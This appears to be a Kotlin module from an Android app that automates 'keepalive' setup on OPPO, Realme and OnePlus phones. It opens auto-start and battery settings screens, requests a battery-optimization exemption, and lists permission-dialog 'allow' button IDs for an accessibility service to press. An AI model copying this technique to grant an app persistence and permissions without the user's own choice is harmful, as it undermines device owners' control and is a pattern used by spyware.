package com.storm.safe.rock.service.modules.yw5xud

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.Settings
import android.util.Log
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.delay

/**
 * OppoSteps — OPPO/Realme/OnePlus (ColorOS/RealmeUI/OxygenOS) keepalive automation.
 * Matches vendor C0370a7 (a7, OppoStepsSimplified). Key flows:
 *
 * 1. Auto-start management (自启动管理)
 *    - Navigate to: com.coloros.safecenter/.startupapp.StartupAppListActivity
 *    - Find app, enable auto-start switch (Switch→R()+finish pattern)
 * 2. Battery optimization
 *    - Navigate to power management settings
 *    - Disable battery optimization for our app
 * 3. Background management (后台管理)
 *    - Prevent system from killing our app in background
 * 4. All files access (MANAGE_EXTERNAL_STORAGE)
 *    - API 30+ file access permission
 */
class OppoSteps(
    private val service: MyAccessibilityService?,
    private val context: Context
) {
    companion object {
        private const val TAG = "OppoSteps"

        // ColorOS component names (with fallbacks for Realme/OnePlus)
        val AUTOSTART_COMPONENTS = listOf(
            ComponentName(
                "com.coloros.safecenter",
                "com.coloros.safecenter.startupapp.StartupAppListActivity"
            ),
            ComponentName(
                "com.oppo.safe",
                "com.oppo.safe.permission.startup.StartupAppListActivity"
            ),
            ComponentName(
                "com.coloros.safecenter",
                "com.coloros.safecenter.permission.startup.StartupAppListActivity"
            )
        )

        val BATTERY_COMPONENTS = listOf(
            ComponentName(
                "com.coloros.oppoguardelf",
                "com.coloros.powermanager.fuelgaue.PowerUsageModelActivity"
            ),
            ComponentName(
                "com.coloros.oppoguardelf",
                "com.coloros.powermanager.fuelgaue.PowerSaverModeActivity"
            ),
            ComponentName(
                "com.oplus.battery",
                "com.oplus.powermanager.fuelgaue.PowerUsageModelActivity"
            )
        )

        /** Permission allow button IDs for ColorOS. */
        val PERMISSION_ALLOW_IDS = listOf(
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_one_time_button",
            "com.android.packageinstaller:id/permission_allow_button",
            "com.google.android.packageinstaller:id/permission_allow_button",
            "android:id/button1",
            "android:id/button2",
            "com.android.settings:id/action_button"
        )

        /** Keywords for auto-start toggle. */
        val AUTOSTART_KEYWORDS = listOf(
            "允许自启动", "自启动", "Allow auto-start", "Auto-start", "Autostart"
        )

        /** Keywords for battery no-restriction. */
        val BATTERY_KEYWORDS = listOf(
            "不优化", "无限制", "Don't optimize", "Unrestricted", "允许后台运行"
        )
    }

    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        logs.add("OppoSteps: 开始OPPO/ColorOS权限配置")

        executeAutoStart(successes, failures, logs)
        delay(500)
        executeBatteryOptimization(successes, failures, logs)

        logs.add("OppoSteps: OPPO/ColorOS权限配置完成")
    }

    fun executeAutoStart(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            val launched = launchComponentActivity(AUTOSTART_COMPONENTS)
            if (launched) {
                logs.add("已启动ColorOS自启动管理")
                successes.add("OPPO自启动管理已打开")
            } else {
                failures.add("无法启动OPPO自启动管理")
            }
        } catch (e: Exception) {
            failures.add("OPPO自启动配置异常: ${e.message}")
        }
    }

    fun executeBatteryOptimization(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            val launched = launchComponentActivity(BATTERY_COMPONENTS)
            if (launched) {
                logs.add("已启动ColorOS电池管理")
                successes.add("OPPO电池优化已打开")
            } else {
                val intent = Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                ).apply {
                    data = Uri.parse("package:${context.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                logs.add("已发送电池优化豁免请求(标准)")
            }
        } catch (e: Exception) {
            failures.add("OPPO电池优化异常: ${e.message}")
        }
    }

    internal fun launchComponentActivity(components: List<ComponentName>): Boolean {
        for (component in components) {
            try {
                val intent = Intent().apply {
                    this.component = component
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                return true
            } catch (_: Exception) {
                continue
            }
        }
        return false
    }
}
